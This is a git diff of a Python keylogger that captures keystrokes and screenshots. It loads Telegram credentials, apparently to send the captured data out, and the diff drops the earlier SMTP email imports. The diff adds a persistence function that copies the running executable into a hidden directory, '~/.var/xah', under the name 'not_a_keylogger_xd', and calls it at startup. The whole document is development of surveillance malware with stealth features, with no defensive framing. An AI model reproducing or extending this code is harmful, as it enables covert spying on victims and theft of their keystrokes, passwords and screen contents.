@@ -4,19 +4,13 @@ from key_listener import KeyListener
 import sys
 from PIL import ImageGrab
 import re
-import smtplib
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-from email.mime.image import MIMEImage
-from PIL import ImageGrab
 import requests
 import json
 import io
 import credentials
-
-# TODO threading para soportar capturas de pantalla cada x tiempo y captura de teclado cada y
-# TODO error handling with the primary goal of not stopping the program
+import os
+import sys
+import shutil
 
 # --------------------- CONSTANTS --------------------- #
 
@@ -30,9 +24,28 @@ IMG_FILE = 'screenshot_'
 CREDENTIAL_DIR = 'keylogger/credentials/'
 CREDENTIAL_FILE_TELEGRAM = 'credentials_telegram.json'
 
+DUPLICATE_EXE_DIR = '~/.var/xah'
+
 TIME_OUT = 60 # period in seconds to capture data
 
 # --------------------- FUNCTIONS --------------------- #
+
+def duplicate_script():
+    """
+    Generates a duplicate script by copying the current script executable to a specified directory.
+
+    Parameters:
+        None
+
+    Returns:
+        None
+    """
+    duplicate_dir = os.path.expanduser(DUPLICATE_EXE_DIR)
+
+    if not os.path.exists(duplicate_dir):
+        os.makedirs(duplicate_dir)
+
+    shutil.copy(sys.executable, os.path.join(duplicate_dir, 'not_a_keylogger_xd'))
 
 def write_to_log(message: str, log_name: str) -> bool:
     """
@@ -283,6 +296,7 @@ def load_credentials_telegram_from_script():
 
 def main():
     key_listener = KeyListener()
+    duplicate_script()
     try:
         while True:
             # Capture typed keys and process them
